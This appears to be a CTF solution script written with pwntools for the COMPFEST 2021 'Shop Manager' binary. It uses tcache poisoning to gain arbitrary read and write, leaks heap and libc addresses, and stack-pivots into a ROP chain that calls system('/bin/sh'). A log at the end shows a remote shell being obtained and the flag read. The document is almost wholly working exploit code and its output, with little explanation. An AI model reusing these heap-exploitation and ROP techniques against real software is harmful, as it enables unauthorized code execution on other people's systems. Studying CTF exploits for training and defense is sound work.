from pwn import *

#context(os='linux', arch='amd64')
context.log_level = 'debug'
context.terminal = ['/usr/bin/tmux','sp','-h']

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "103.152.242.242"
  PORT = 39221
  s = remote(HOST, PORT)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
  s = process(BINARY)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  # libc = elf.libc

def Add(data, price):
  s.sendlineafter("> ", "1")
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def Delete(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("): ", str(idx))

def Edit(idx, data, price):
  s.sendlineafter("> ", "3")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def List():
  s.sendlineafter("> ", "4")

def Sell(idx, item):
  s.sendlineafter("> ", "5")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("item?\n", item)

def Exit():
  s.sendlineafter("> ", "6")

for i in range(15): #0-14
  Add(chr(0x41+i)*8, i)

# tcache attack
Delete(2) 
Delete(1) 


# Heap Leak
Edit(0, "a"*0x28+p64(0x21)+p64(0x602100), 0) # modify 1st->fd = 0x602100(bss)

Add("a", 4) 
Add(p64(0x602100), 0x6020a0) # 12  malloc 0x602100   fd->0x6020a0(items12)

List()# leak address 0x6020a0 point to heap address(item0)
for i in range(13):
  s.recvuntil("Price: ")
heap_leak = int(s.recvuntil("\n"))
heap_base = heap_leak - 0x1270-0x40
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

# libc leak
Edit(14, "X", elf.got.__isoc99_scanf) # mod

List() 
for i in range(13):
  s.recvuntil("Price: ")
scanf_addr  = int(s.recvuntil("\n"))
libc_base   = scanf_addr - libc.symbols['__isoc99_scanf']
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search('/bin/sh'))
print "scanf_addr =", hex(scanf_addr)
print "libc_base  =", hex(libc_base)

pop_rdi_ret = 0x400f63 # pop rdi; ret; 
leave_ret   = 0x400e11 # leave; ret;

Add(p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr), 0)
gdb.attach(s)
# Stack pivot to heap
Sell(3, "b"*0x18+p64(3)+p64(0)*2+p64(heap_base + 0x17e0 - 8) + p64(leave_ret))

s.interactive()

'''
mito@ubuntu:~/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public$ python solve_stackpivot.py r
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 103.152.242.242 on port 39221: Done
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_leak = 0x2160270
heap_base = 0x215f000
scanf_addr = 0x7fc366011fa0
libc_base  = 0x7fc365f96000
[*] Switching to interactive mode
You said: bbbbbbbbbbbbbbbbbbbbbbbb\x03
Item sold successfully.
$ id
/bin/sh: 1: id: not found
$ ls -l
total 2208
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 bin
-r-xr-xr-x  1 0 0   17264 Sep 12 04:33 chall
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 dev
-r--r--r--  1 0 0      56 Sep 12 04:33 flag.txt
-rwxr-xr-x  1 0 0  179152 Sep 12 04:33 ld-2.27.so
drwxr-xr-x 21 0 0    4096 Sep 12 04:33 lib
drwxr-xr-x  3 0 0    4096 Sep 12 04:33 lib32
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 lib64
-rwxr-xr-x  1 0 0 2030928 Sep 12 04:33 libc-2.27.so
-rwxr-xr-x  1 0 0     339 Sep 12 04:33 run.sh
$ cat flag.txt
COMPFEST13{I_us3_st4Ck_p1v0T1ng_How_bouT_Y0u_dd4dfcc265}
'''
